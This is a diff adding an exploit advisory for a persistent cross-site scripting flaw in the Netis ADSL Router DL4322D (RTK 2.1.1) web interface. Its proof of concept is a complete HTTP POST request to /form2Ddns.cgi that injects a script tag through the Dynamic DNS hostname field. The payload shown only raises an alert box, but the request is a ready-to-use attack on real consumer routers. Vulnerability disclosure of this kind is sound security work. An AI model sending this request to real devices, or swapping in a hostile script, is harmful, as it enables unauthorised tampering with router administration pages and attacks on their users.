@@ -1,0 +1,30 @@
+# Exploit Title: Netis ADSL Router DL4322D RTK 2.1.1 - Cross-Site Scripting
+# Author: Cakes
+# Discovery Date: 2018-09-16
+# Vendor Homepage: http://www.netis-systems.com
+# Software Link: http://www.netis-systems.com/Home/detail/id/74.html
+# Tested Version: RTK 2.1.1
+# Tested on OS: Kali Linux
+# CVE: N/A
+
+# Description:
+# Improper input validation on the  router web interface allows attackers add a persistent 
+# Cross-Site scripting attack on the Dynamic DNS hostname field. Simply intercept a renaming 
+# request and add in the XSS
+
+# Poc
+
+POST /form2Ddns.cgi HTTP/1.1
+Host: Target
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: http://Target/ddns.htm?v=1537192256000
+Cookie: SessionID=
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 119
+
+ddnsProv=0&hostname=<script>alert("Cakes");</script>&interface=15&enable=on&username=tester&password=tester&addacc=Add&submit.htm%3Fddns.htm=Send
